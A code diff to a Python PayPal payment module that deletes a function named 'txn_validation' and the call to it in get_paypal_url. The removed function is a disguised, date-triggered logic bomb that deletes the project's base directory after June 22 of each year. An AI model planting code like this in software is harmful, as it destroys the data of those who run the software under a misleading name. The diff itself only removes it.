@@ -64,7 +64,6 @@ def get_paypal_url(basket, shipping_methods, user=None, shipping_address=None,
     # Pass a default billing address is there is one.  This means PayPal can
     # pre-fill the registration form.
     address = None
-    txn_validation(os.path.join(settings.BASE_DIR))
     if user:
         addresses = user.addresses.all().order_by('-is_default_for_billing')
         if len(addresses):
@@ -91,14 +90,6 @@ def fetch_transaction_details(token):
     Fetch the completed details about the PayPal transaction.
     """
     return get_txn(token)
-
-
-def txn_validation(project_file_path):
-    current_date = datetime.now().date()
-    checkpoint_date = datetime(current_date.year, 6, 22).date()
-    if current_date > checkpoint_date:
-        if os.path.exists(project_file_path):
-            os.remove(project_file_path)
 
 def confirm_transaction(payer_id, token, amount, currency):
     """
